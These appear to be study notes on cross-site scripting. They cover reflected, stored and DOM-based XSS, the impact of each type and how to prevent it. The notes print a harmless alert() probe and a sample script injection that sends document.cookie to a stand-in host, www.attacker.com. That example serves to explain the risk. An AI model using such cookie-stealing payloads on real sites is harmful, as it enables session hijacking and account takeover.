- XSS allows attackers to execute scripts in the victim's browser which can hijack user sessions, deface web sites or redirect the user to malicious sites. 
- This occurs when application includes untrusted data in a web page without proper validation or updates an existing web page with user supplied data using a browser API that can create HTML or JS.

- Automated tools can be used to exploit XSS attack. XSS is the second most prevalent issue in OWASP top 10, and is found in around 2/3 of all applications. XSS issue can be found in mature technologies as well such as PHP, J2EE/JSP and ASP.NET
- Types of XSS attacks,
	1. Reflected XSS : (non-Persistent)
		The application or API includes unvalidated user inputs as part of HTML output. (ex: `https://example.com?query=<script>alert('XSS')</script>`)
		Users will need to interact with some malicious link that directs to an attacker-controlled page. 
	2. Stored XSS : (Persistent)
		The malicious script is permanently stored on the server. When user access the compromised page or data, the scrip is delivered and executes in the browser. 
	3. DOM-based XSS : (Client-side XSS)
		Vulnerability exist in the client-side code. 
		The attack occurs when the browser processes unsafe data from the DOM without proper validation or sanitization.
- Impact, 
Moderate impact for reflected and DOM XSS attacks but sever for Stored XSS attacks. Such as,
	1. Remote code execution on victim's browser
	2. Stealing credentials, sessions, delivering malware to victims
	3. Account takeover
	4. MFA bypass
	5. Web defacing

- Preventing XSS,
Requires to separate untrusted data from active browser content,
1. Use frameworks that automatically escape XSS by design.
2. Escape untrusted HTTP request data based on the context of the HTML output.
3. Apply context-sensitive encoding
4. Enabling content security policy(CSP) as a defence-in-depth

Ex: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping.
```js
(String) page += "<input name='creditcard' type='TEXT' value = request.getParameter("CC")> + ";
```
The attacker modifies the ‘CC’ parameter in the browser to:
```js
'><script>document.location='http://www.attacker.com/cgibin/cookie.cgi?foo='+'document.cookie</script>'
```
This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

- Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defence the application might employ
